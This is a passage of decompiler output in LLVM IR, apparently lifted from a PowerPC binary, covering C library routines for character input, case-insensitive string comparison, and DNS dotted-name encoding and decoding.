  %v3_100141cc = icmp eq i32 %v1_100141cc, 0
  br i1 %v3_100141cc, label %dec_label_pc_100141e0, label %dec_label_pc_100141d4

dec_label_pc_100141d4:                            ; preds = %dec_label_pc_100141cc
  store i32 ptrtoint (i32** @global_var_1002b8e0.714 to i32), i32* %r3.global-to-local, align 4
  store i32 268517856, i32* @lr, align 4
  %v4_100141dc = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002b8e0.714 to i16*), i32 %v3_10014194)
  store i32 %v4_100141dc, i32* %r3.global-to-local, align 4
  %v0_100141e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100141e0

dec_label_pc_100141e0:                            ; preds = %dec_label_pc_100141cc, %dec_label_pc_100141d4
  %v0_10014220 = phi i32 [ %v2_100141c4, %dec_label_pc_100141cc ], [ %v0_100141e0.pre, %dec_label_pc_100141d4 ]
  %v1_100141e0 = add i32 %v0_10014220, 8
  %v2_100141e0 = inttoptr i32 %v1_100141e0 to i32*
  %v3_100141e0 = load i32, i32* %v2_100141e0, align 4
  store i32 %v3_100141e0, i32* %r9.global-to-local, align 4
  %v1_100141e4 = add i32 %v0_10014220, 12
  %v2_100141e4 = inttoptr i32 %v1_100141e4 to i32*
  %v3_100141e4 = load i32, i32* %v2_100141e4, align 4
  store i32 %v3_100141e4, i32* %r0.global-to-local, align 4
  %v4_100141e8 = icmp eq i32 %v3_100141e4, %v3_100141e0
  br i1 %v4_100141e8, label %dec_label_pc_10014220, label %dec_label_pc_100141f0

dec_label_pc_100141f0:                            ; preds = %dec_label_pc_100141e0
  %v2_100141f0 = add i32 %v0_10014220, 24
  %v3_100141f0 = inttoptr i32 %v2_100141f0 to i32*
  store i32 %v3_100141e0, i32* %v3_100141f0, align 4
  %v0_100141f4 = load i32, i32* @r31, align 4
  store i32 %v0_100141f4, i32* %r3.global-to-local, align 4
  store i32 268517884, i32* @lr, align 4
  %v3_100141f8 = call i32 @__stdio_rfill(i32 %v0_100141f4, i32 %v3_100141e0)
  store i32 %v3_100141f8, i32* %r3.global-to-local, align 4
  %v3_100141fc = icmp eq i32 %v3_100141f8, 0
  br i1 %v3_100141fc, label %dec_label_pc_10014240, label %dec_label_pc_10014204

dec_label_pc_10014204:                            ; preds = %dec_label_pc_100141f0
  %v0_10014204 = load i32, i32* @r31, align 4
  %v1_10014204 = add i32 %v0_10014204, 20
  %v2_10014204 = inttoptr i32 %v1_10014204 to i32*
  %v3_10014204 = load i32, i32* %v2_10014204, align 4
  store i32 %v3_10014204, i32* %r0.global-to-local, align 4
  %v1_10014208 = add i32 %v0_10014204, 16
  %v2_10014208 = inttoptr i32 %v1_10014208 to i32*
  %v3_10014208 = load i32, i32* %v2_10014208, align 4
  store i32 %v3_10014208, i32* %r9.global-to-local, align 4
  %v2_1001420c = add i32 %v0_10014204, 24
  %v3_1001420c = inttoptr i32 %v2_1001420c to i32*
  store i32 %v3_10014204, i32* %v3_1001420c, align 4
  %v0_10014210 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014210 = add i32 %v0_10014210, 1
  store i32 %v1_10014210, i32* %r0.global-to-local, align 4
  %v1_10014214 = inttoptr i32 %v0_10014210 to i8*
  %v2_10014214 = load i8, i8* %v1_10014214, align 1
  %v3_10014214 = zext i8 %v2_10014214 to i32
  store i32 %v3_10014214, i32* %r3.global-to-local, align 4
  %v1_10014218.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014218

dec_label_pc_10014218:                            ; preds = %dec_label_pc_100141a4, %dec_label_pc_10014204
  %v1_10014218 = phi i32 [ %v1_100142187, %dec_label_pc_100141a4 ], [ %v1_10014218.pre, %dec_label_pc_10014204 ]
  %v0_10014218 = phi i32 [ %v1_100141a8, %dec_label_pc_100141a4 ], [ %v1_10014210, %dec_label_pc_10014204 ]
  %v2_10014218 = add i32 %v1_10014218, 16
  %v3_10014218 = inttoptr i32 %v2_10014218 to i32*
  store i32 %v0_10014218, i32* %v3_10014218, align 4
  br label %dec_label_pc_10014244

dec_label_pc_10014220:                            ; preds = %dec_label_pc_100141e0
  %v1_10014220 = inttoptr i32 %v0_10014220 to i16*
  store i32 %v0_10014220, i32* %r3.global-to-local, align 4
  %v2_10014224 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268517936, i32* @lr, align 4
  %v5_1001422c = call i32 @__stdio_READ(i16* %v1_10014220, i32 %v2_10014224, i32 1)
  store i32 %v5_1001422c, i32* %r3.global-to-local, align 4
  %v3_10014230 = icmp eq i32 %v5_1001422c, 0
  br i1 %v3_10014230, label %dec_label_pc_10014240, label %dec_label_pc_10014238

dec_label_pc_10014238:                            ; preds = %dec_label_pc_10014220
  %v3_10014238 = load i8, i8* %stack_var_-24, align 1
  %v4_10014238 = sext i8 %v3_10014238 to i32
  store i32 %v4_10014238, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014244

dec_label_pc_10014240:                            ; preds = %dec_label_pc_10014154, %dec_label_pc_10014220, %dec_label_pc_100141f0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014244

dec_label_pc_10014244:                            ; preds = %dec_label_pc_10014238, %dec_label_pc_10014218, %dec_label_pc_100141bc, %dec_label_pc_10014170, %dec_label_pc_10014240
  store i32 %v0_10014120, i32* %r0.global-to-local, align 4
  store i32 %v0_10014128, i32* @r31, align 4
  %v0_10014254 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014254

; uselistorder directives
  uselistorder i32 %v0_10014220, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_100141a4, { 1, 0 }
  uselistorder i32 %v3_10014194, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10014174, { 1, 0 }
  uselistorder i32 %v3_10014164, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_100141c4, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 9, 1, 2, 11, 3, 4, 12, 5, 13, 6, 7, 8, 10, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_1002b8e0.714 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002b5a4.705, { 2, 1, 0, 3 }
  uselistorder i32 -2, { 21, 9, 10, 11, 2, 3, 5, 12, 13, 7, 1, 0, 14, 15, 16, 18, 19, 17, 20, 6, 8, 4 }
  uselistorder i32 40, { 9, 10, 11, 3, 12, 0, 4, 5, 6, 7, 8, 1, 2 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 29, { 6, 7, 8, 11, 12, 5, 9, 10, 0, 1, 13, 14, 2, 3, 17, 18, 15, 16, 4 }
  uselistorder i32 128, { 5, 20, 21, 0, 1, 22, 23, 4, 18, 3, 6, 7, 11, 12, 13, 14, 8, 15, 16, 17, 2, 9, 19, 10 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_10014244, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10014240, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10014218, { 1, 0 }
  uselistorder label %dec_label_pc_100141e0, { 1, 0 }
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001425c = load i32, i32* bitcast (i32** @global_var_1002b8f4.736 to i32*), align 4
  %v0_10014264.pre = load i32, i32* @r3, align 4
  %v1_10014264.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014264

dec_label_pc_10014264:                            ; preds = %dec_label_pc_1001428c, %entry
  %v0_100142a06 = phi i32 [ %v0_100142a07, %dec_label_pc_1001428c ], [ 0, %entry ]
  %v0_10014290 = phi i32 [ %v1_10014290, %dec_label_pc_1001428c ], [ %v1_10014264.pre, %entry ]
  %v0_10014294 = phi i32 [ %v1_10014294, %dec_label_pc_1001428c ], [ %v0_10014264.pre, %entry ]
  %v4_10014264 = icmp eq i32 %v0_10014294, %v0_10014290
  %.pre = inttoptr i32 %v0_10014294 to i8*
  br i1 %v4_10014264, label %dec_label_pc_1001428c, label %dec_label_pc_1001426c

dec_label_pc_1001426c:                            ; preds = %dec_label_pc_10014264
  %v2_1001426c = load i8, i8* %.pre, align 1
  %v3_1001426c = zext i8 %v2_1001426c to i32
  %v1_10014270 = inttoptr i32 %v0_10014290 to i8*
  %v2_10014270 = load i8, i8* %v1_10014270, align 1
  %v3_10014270 = zext i8 %v2_10014270 to i32
  %v1_10014274 = mul nuw nsw i32 %v3_1001426c, 2
  %v1_10014278 = mul nuw nsw i32 %v3_10014270, 2
  %v2_1001427c = add i32 %v1_10014274, %v3_1001425c
  %v3_1001427c = inttoptr i32 %v2_1001427c to i16*
  %v4_1001427c = load i16, i16* %v3_1001427c, align 2
  %v5_1001427c = sext i16 %v4_1001427c to i32
  %v2_10014280 = add i32 %v1_10014278, %v3_1001425c
  %v3_10014280 = inttoptr i32 %v2_10014280 to i16*
  %v4_10014280 = load i16, i16* %v3_10014280, align 2
  %v5_10014280 = sext i16 %v4_10014280 to i32
  %v2_10014284 = sub nsw i32 %v5_1001427c, %v5_10014280
  %v4_10014288 = icmp eq i16 %v4_1001427c, %v4_10014280
  br i1 %v4_10014288, label %dec_label_pc_1001428c, label %dec_label_pc_100142a0

dec_label_pc_1001428c:                            ; preds = %dec_label_pc_10014264, %dec_label_pc_1001426c
  %v0_100142a07 = phi i32 [ %v2_10014284, %dec_label_pc_1001426c ], [ %v0_100142a06, %dec_label_pc_10014264 ]
  %v2_1001428c = load i8, i8* %.pre, align 1
  %v1_10014290 = add i32 %v0_10014290, 1
  %v1_10014294 = add i32 %v0_10014294, 1
  %v3_10014298 = icmp eq i8 %v2_1001428c, 0
  br i1 %v3_10014298, label %dec_label_pc_100142a0, label %dec_label_pc_10014264

dec_label_pc_100142a0:                            ; preds = %dec_label_pc_1001428c, %dec_label_pc_1001426c
  %v0_100142a0 = phi i32 [ %v0_100142a07, %dec_label_pc_1001428c ], [ %v2_10014284, %dec_label_pc_1001426c ]
  ret i32 %v0_100142a0

; uselistorder directives
  uselistorder i32 %v2_10014284, { 1, 0 }
  uselistorder i32 %v0_10014294, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001428c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100142ac = load i32, i32* @lr, align 4
  store i32 %v0_100142ac, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_100142b8 = load i32, i32* @r4, align 4
  store i32 %v0_100142b8, i32* @r29, align 4
  %v0_100142bc = load i32, i32* @r5, align 4
  store i32 %v0_100142bc, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001432813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001432813, label %dec_label_pc_10014344, label %dec_label_pc_10014338

dec_label_pc_100142cc:                            ; preds = %dec_label_pc_10014338
  store i32 268518096, i32* @lr, align 4
  %v3_100142cc = call i32 @__GI_strchr(i32 %v0_1001433814, i32 46)
  store i32 %v3_100142cc, i32* @r30, align 4
  %v3_100142d0 = icmp eq i32 %v3_100142cc, 0
  %v0_100142d4 = load i32, i32* @r31, align 4
  store i32 %v0_100142d4, i32* @r3, align 4
  %v2_100142d8 = sub i32 %v3_100142cc, %v0_100142d4
  store i32 %v2_100142d8, i32* %r0.global-to-local, align 4
  br i1 %v3_100142d0, label %dec_label_pc_100142e0, label %dec_label_pc_100142e8

dec_label_pc_100142e0:                            ; preds = %dec_label_pc_100142cc
  %v0_100142e0 = call i32 @__GI_strlen()
  store i32 %v0_100142e0, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_100142e0, 16777216
  %v1_100142e4 = sdiv i32 %sext, 16777216
  store i32 %v1_100142e4, i32* %r0.global-to-local, align 4
  %v0_100142f8.pre = load i32, i32* @r31, align 4
  %v0_10014308.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100142e8

dec_label_pc_100142e8:                            ; preds = %dec_label_pc_100142cc, %dec_label_pc_100142e0
  %v0_10014308 = phi i32 [ %v3_100142cc, %dec_label_pc_100142cc ], [ %v0_10014308.pre, %dec_label_pc_100142e0 ]
  %v0_100142f8 = phi i32 [ %v0_100142d4, %dec_label_pc_100142cc ], [ %v0_100142f8.pre, %dec_label_pc_100142e0 ]
  %v0_10014314 = phi i32 [ %v2_100142d8, %dec_label_pc_100142cc ], [ %v1_100142e4, %dec_label_pc_100142e0 ]
  %v0_100142ec = load i32, i32* @r28, align 4
  %v1_100142ec = load i32, i32* %r27.global-to-local, align 4
  %v2_100142ec = sub i32 %v1_100142ec, %v0_100142ec
  %v1_100142f0 = add i32 %v0_100142ec, 1
  store i32 %v1_100142f0, i32* %r11.global-to-local, align 4
  %v1_100142f4 = add i32 %v2_100142ec, -1
  store i32 %v0_100142f8, i32* @r4, align 4
  %v0_100142fc = load i32, i32* @r29, align 4
  %v2_100142fc = add i32 %v0_100142fc, %v1_100142f0
  store i32 %v2_100142fc, i32* @r3, align 4
  store i32 %v0_10014314, i32* @r5, align 4
  %v2_10014304 = icmp ult i32 %v0_10014314, %v1_100142f4
  %v1_10014308 = add i32 %v0_10014308, 1
  store i32 %v1_10014308, i32* @r31, align 4
  %v3_100142e8.not = icmp ne i32 %v0_10014314, 0
  %or.cond = and i1 %v2_10014304, %v3_100142e8.not
  br i1 %or.cond, label %dec_label_pc_10014314, label %dec_label_pc_1001435c

dec_label_pc_10014314:                            ; preds = %dec_label_pc_100142e8
  %v3_10014314 = trunc i32 %v0_10014314 to i8
  %v4_10014314 = add i32 %v0_100142fc, %v0_100142ec
  %v5_10014314 = inttoptr i32 %v4_10014314 to i8*
  store i8 %v3_10014314, i8* %v5_10014314, align 1
  %v0_10014318 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014318 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014318 = add i32 %v1_10014318, %v0_10014318
  store i32 %v2_10014318, i32* @r28, align 4
  store i32 268518176, i32* @lr, align 4
  %v0_1001431c = call i32 @memcpy()
  store i32 %v0_1001431c, i32* %r3.global-to-local, align 4
  %v0_10014320 = load i32, i32* @r30, align 4
  %v3_10014320 = icmp eq i32 %v0_10014320, 0
  br i1 %v3_10014320, label %dec_label_pc_10014344, label %dec_label_pc_10014314.dec_label_pc_10014328_crit_edge

dec_label_pc_10014314.dec_label_pc_10014328_crit_edge: ; preds = %dec_label_pc_10014314
  %v0_10014328.pre = load i32, i32* @r31, align 4
  %v3_10014328 = icmp eq i32 %v0_10014328.pre, 0
  store i32 %v0_10014328.pre, i32* @r3, align 4
  br i1 %v3_10014328, label %dec_label_pc_10014344, label %dec_label_pc_10014338

dec_label_pc_10014338:                            ; preds = %entry, %dec_label_pc_10014314.dec_label_pc_10014328_crit_edge
  %v0_1001433814 = phi i32 [ %v0_10014328.pre, %dec_label_pc_10014314.dec_label_pc_10014328_crit_edge ], [ %tmp, %entry ]
  %v1_10014338 = inttoptr i32 %v0_1001433814 to i8*
  %v2_10014338 = load i8, i8* %v1_10014338, align 1
  %v3_10014338 = zext i8 %v2_10014338 to i32
  store i32 %v3_10014338, i32* %r0.global-to-local, align 4
  %v3_1001433c = icmp eq i8 %v2_10014338, 0
  br i1 %v3_1001433c, label %dec_label_pc_10014344, label %dec_label_pc_100142cc

dec_label_pc_10014344:                            ; preds = %dec_label_pc_10014314.dec_label_pc_10014328_crit_edge, %dec_label_pc_10014314, %dec_label_pc_10014338, %entry
  %v0_10014344 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_10014344, 1
  br i1 %tmp10, label %dec_label_pc_1001435c, label %dec_label_pc_1001434c

dec_label_pc_1001434c:                            ; preds = %dec_label_pc_10014344
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014350 = load i32, i32* @r28, align 4
  %v1_10014350 = add i32 %v0_10014350, 1
  store i32 %v1_10014350, i32* %r3.global-to-local, align 4
  %v1_10014354 = load i32, i32* @r29, align 4
  %v4_10014354 = add i32 %v1_10014354, %v0_10014350
  %v5_10014354 = inttoptr i32 %v4_10014354 to i8*
  store i8 0, i8* %v5_10014354, align 1
  %v0_10014370.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014360

dec_label_pc_1001435c:                            ; preds = %dec_label_pc_100142e8, %dec_label_pc_10014344
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014360

dec_label_pc_10014360:                            ; preds = %dec_label_pc_1001434c, %dec_label_pc_1001435c
  %v0_10014370 = phi i32 [ %v0_10014370.pre, %dec_label_pc_1001434c ], [ -1, %dec_label_pc_1001435c ]
  store i32 %v0_100142ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014370

; uselistorder directives
  uselistorder i32 %v0_1001433814, { 1, 0 }
  uselistorder i32 %v0_10014328.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10014314, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100142e4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 5, 25, 24, 4, 1, 17, 16, 15, 26, 23, 22, 14, 12, 13, 11, 10, 21, 20, 19, 0, 18, 9, 7, 8, 3, 2, 6 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 46, { 0, 5, 3, 6, 7, 4, 1, 2 }
  uselistorder label %dec_label_pc_10014360, { 1, 0 }
  uselistorder label %dec_label_pc_1001435c, { 1, 0 }
  uselistorder label %dec_label_pc_10014344, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10014338, { 1, 0 }
  uselistorder label %dec_label_pc_100142e8, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_10014378 = call i32 @__asm_mfcr()
  store i32 %v0_10014378, i32* @r26, align 4
  %v3_10014384 = icmp eq i32 %v0_10014378, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_10014394 = load i32, i32* @r6, align 4
  store i32 %v0_10014394, i32* @r24, align 4
  br i1 %v3_10014384, label %dec_label_pc_1001444c, label %dec_label_pc_1001439c

dec_label_pc_1001439c:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001442814 = load i32, i32* @r4, align 4
  %v2_1001442815 = add i32 %v1_1001442814, %v0_10014378
  %v3_1001442816 = inttoptr i32 %v2_1001442815 to i8*
  %v4_1001442817 = load i8, i8* %v3_1001442816, align 1
  %v5_1001442818 = zext i8 %v4_1001442817 to i32
  store i32 %v5_1001442818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1001443020 = icmp eq i8 %v4_1001442817, 0
  br i1 %v3_1001443020, label %dec_label_pc_1001443c, label %dec_label_pc_100143ac

dec_label_pc_100143ac:                            ; preds = %dec_label_pc_1001439c, %dec_label_pc_10014424
  %v3_1001442c22 = phi i1 [ %v3_1001442c, %dec_label_pc_10014424 ], [ false, %dec_label_pc_1001439c ]
  %v5_1001442821 = phi i32 [ %v5_10014428, %dec_label_pc_10014424 ], [ %v5_1001442818, %dec_label_pc_1001439c ]
  br i1 %v3_1001442c22, label %dec_label_pc_100143b4, label %dec_label_pc_100143b0

dec_label_pc_100143b0:                            ; preds = %dec_label_pc_100143ac
  %v0_100143b0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100143b0 = add i32 %v0_100143b0, 1
  store i32 %v1_100143b0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100143b4

dec_label_pc_100143b4:                            ; preds = %dec_label_pc_100143ac, %dec_label_pc_100143b0
  %v1_100143b4 = call i32 @__asm_rlwinm(i32 %v5_1001442821, i32 0, i32 24, i32 25)
  %v0_100143b8 = load i32, i32* @r4, align 4
  %v1_100143b8 = add i32 %v0_100143b8, 1
  store i32 %v1_100143b8, i32* @r30, align 4
  %v3_100143bc = icmp eq i32 %v1_100143b4, 192
  br i1 %v3_100143bc, label %dec_label_pc_100143c4, label %dec_label_pc_100143e4

dec_label_pc_100143c4:                            ; preds = %dec_label_pc_100143b4
  %v0_100143c4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100143c4, label %dec_label_pc_100143cc, label %dec_label_pc_100143c8

dec_label_pc_100143c8:                            ; preds = %dec_label_pc_100143c4
  %v0_100143c8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100143c8 = add i32 %v0_100143c8, 1
  store i32 %v1_100143c8, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100143cc

dec_label_pc_100143cc:                            ; preds = %dec_label_pc_100143c4, %dec_label_pc_100143c8
  %v0_100143cc = load i32, i32* @r26, align 4
  %v2_100143cc = add i32 %v0_100143cc, %v1_100143b8
  %v3_100143cc = inttoptr i32 %v2_100143cc to i8*
  %v4_100143cc = load i8, i8* %v3_100143cc, align 1
  %v5_100143cc = zext i8 %v4_100143cc to i32
  %v1_100143d0 = call i32 @__asm_rlwinm(i32 %v5_1001442821, i32 8, i32 18, i32 23)
  %v0_100143d4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100143d4, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_100143dc = or i32 %v5_100143cc, %v1_100143d0
  store i32 %v2_100143dc, i32* @r4, align 4
  br label %dec_label_pc_10014424

dec_label_pc_100143e4:                            ; preds = %dec_label_pc_100143b4
  %v0_100143e4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100143e4 = add i32 %v0_100143e4, %v5_1001442821
  store i32 %v2_100143e4, i32* @r29, align 4
  %v1_100143e8 = add i32 %v2_100143e4, 1
  store i32 %v1_100143e8, i32* @r28, align 4
  %v1_100143ec = load i32, i32* @r24, align 4
  %v2_100143ec = icmp ult i32 %v1_100143e8, %v1_100143ec
  br i1 %v2_100143ec, label %dec_label_pc_100143f4, label %dec_label_pc_1001444c

dec_label_pc_100143f4:                            ; preds = %dec_label_pc_100143e4
  %v0_100143f4 = load i32, i32* @r26, align 4
  %v2_100143f4 = add i32 %v0_100143f4, %v1_100143b8
  store i32 %v2_100143f4, i32* @r4, align 4
  %v0_100143f8 = load i32, i32* @r25, align 4
  %v2_100143f8 = add i32 %v0_100143f8, %v0_100143e4
  store i32 %v2_100143f8, i32* @r3, align 4
  store i32 %v5_1001442821, i32* @r5, align 4
  store i32 268518404, i32* @lr, align 4
  %v0_10014400 = call i32 @memcpy()
  %v0_10014404 = load i32, i32* @r30, align 4
  %v2_10014404 = add i32 %v0_10014404, %v5_1001442821
  store i32 %v2_10014404, i32* @r4, align 4
  %v0_10014408 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10014408, label %dec_label_pc_10014410, label %dec_label_pc_1001440c

dec_label_pc_1001440c:                            ; preds = %dec_label_pc_100143f4
  %v0_1001440c = load i32, i32* %r27.global-to-local, align 4
  %v2_1001440c = add i32 %v0_1001440c, %v5_1001442821
  store i32 %v2_1001440c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014410

dec_label_pc_10014410:                            ; preds = %dec_label_pc_100143f4, %dec_label_pc_1001440c
  %v0_10014410 = load i32, i32* @r26, align 4
  %v2_10014410 = add i32 %v0_10014410, %v2_10014404
  %v3_10014410 = inttoptr i32 %v2_10014410 to i8*
  %v4_10014410 = load i8, i8* %v3_10014410, align 1
  %v3_10014414 = icmp eq i8 %v4_10014410, 0
  br i1 %v3_10014414, label %dec_label_pc_10014420, label %dec_label_pc_1001441c

dec_label_pc_1001441c:                            ; preds = %dec_label_pc_10014410
  br label %dec_label_pc_10014420

dec_label_pc_10014420:                            ; preds = %dec_label_pc_10014410, %dec_label_pc_1001441c
  %v0_10014420.off0 = phi i8 [ 0, %dec_label_pc_10014410 ], [ 46, %dec_label_pc_1001441c ]
  %v1_10014420 = load i32, i32* @r25, align 4
  %v2_10014420 = load i32, i32* @r29, align 4
  %v4_10014420 = add i32 %v2_10014420, %v1_10014420
  %v5_10014420 = inttoptr i32 %v4_10014420 to i8*
  store i8 %v0_10014420.off0, i8* %v5_10014420, align 1
  %v0_10014424.pre = load i32, i32* @r28, align 4
  %v0_1001442c.pre.pre = load i32, i32* @r23, align 4
  %v1_10014428.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014424

dec_label_pc_10014424:                            ; preds = %dec_label_pc_100143cc, %dec_label_pc_10014420
  %v1_10014428 = phi i32 [ %v2_100143dc, %dec_label_pc_100143cc ], [ %v1_10014428.pre, %dec_label_pc_10014420 ]
  %v0_1001442c.pre = phi i32 [ 0, %dec_label_pc_100143cc ], [ %v0_1001442c.pre.pre, %dec_label_pc_10014420 ]
  %v0_10014424 = phi i32 [ %v0_100143d4, %dec_label_pc_100143cc ], [ %v0_10014424.pre, %dec_label_pc_10014420 ]
  %v0_10014428.pre = load i32, i32* @r26, align 4
  store i32 %v0_10014424, i32* %r11.global-to-local, align 4
  %v2_10014428 = add i32 %v1_10014428, %v0_10014428.pre
  %v3_10014428 = inttoptr i32 %v2_10014428 to i8*
  %v4_10014428 = load i8, i8* %v3_10014428, align 1
  %v5_10014428 = zext i8 %v4_10014428 to i32
  store i32 %v5_10014428, i32* @r31, align 4
  %v3_1001442c = icmp eq i32 %v0_1001442c.pre, 0
  store i1 %v3_1001442c, i1* %cr4_eq.global-to-local, align 1
  %v3_10014430 = icmp eq i8 %v4_10014428, 0
  br i1 %v3_10014430, label %dec_label_pc_10014438, label %dec_label_pc_100143ac

dec_label_pc_10014438:                            ; preds = %dec_label_pc_10014424
  %v0_10014440.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1001442c, label %dec_label_pc_1001444c, label %dec_label_pc_1001443c

dec_label_pc_1001443c:                            ; preds = %dec_label_pc_1001439c, %dec_label_pc_10014438
  %v0_10014440.pre26 = phi i32 [ %v0_10014440.pre.pre, %dec_label_pc_10014438 ], [ 0, %dec_label_pc_1001439c ]
  %v1_1001443c = add i32 %v0_10014440.pre26, 1
  store i32 %v1_1001443c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1001444c

dec_label_pc_1001444c:                            ; preds = %dec_label_pc_100143e4, %dec_label_pc_10014438, %dec_label_pc_1001443c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1001443c, %dec_label_pc_1001443c ], [ %v0_10014440.pre.pre, %dec_label_pc_10014438 ], [ -1, %dec_label_pc_100143e4 ]
  %v1_1001445c = call %1 @__asm_mtcrf(i32 8, i32 %v0_10014378)
  %v9_1001445c = extractvalue %1 %v1_1001445c, 7
  store i4 %v9_1001445c, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10014440.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1001442c, { 0, 2, 1 }
  uselistorder i32 %v5_10014428, { 1, 0 }
  uselistorder i32 %v5_1001442821, { 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %v0_10014378, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @memcpy, { 12, 11, 10, 9, 8, 4, 3, 7, 6, 2, 19, 17, 16, 0, 5, 1, 15, 14, 13, 18 }
  uselistorder i32* @r5, { 42, 43, 44, 3, 45, 46, 47, 48, 49, 16, 50, 58, 59, 51, 52, 11, 4, 53, 1, 54, 38, 40, 17, 18, 39, 19, 20, 21, 60, 41, 22, 23, 24, 25, 26, 27, 73, 8, 9, 6, 55, 56, 65, 66, 67, 12, 28, 29, 30, 74, 75, 76, 77, 68, 69, 2, 70, 71, 72, 31, 33, 32, 34, 0, 35, 36, 37, 61, 62, 13, 14, 15, 7, 63, 64, 5, 10, 57 }
  uselistorder i32* @r28, { 2, 67, 68, 69, 70, 71, 72, 77, 78, 73, 74, 75, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 17, 3, 16, 18, 19, 20, 21, 22, 23, 89, 93, 90, 91, 92, 1, 94, 95, 96, 4, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 5, 109, 6, 110, 111, 112, 113, 114, 115, 116, 32, 33, 117, 118, 119, 120, 128, 129, 34, 66, 35, 7, 36, 37, 38, 39, 40, 8, 130, 131, 132, 133, 140, 9, 24, 25, 26, 12, 27, 123, 124, 125, 121, 122, 126, 127, 134, 135, 136, 137, 138, 41, 42, 43, 44, 45, 10, 46, 47, 11, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 64, 65, 13, 14, 15, 139, 30, 31, 28, 29 }
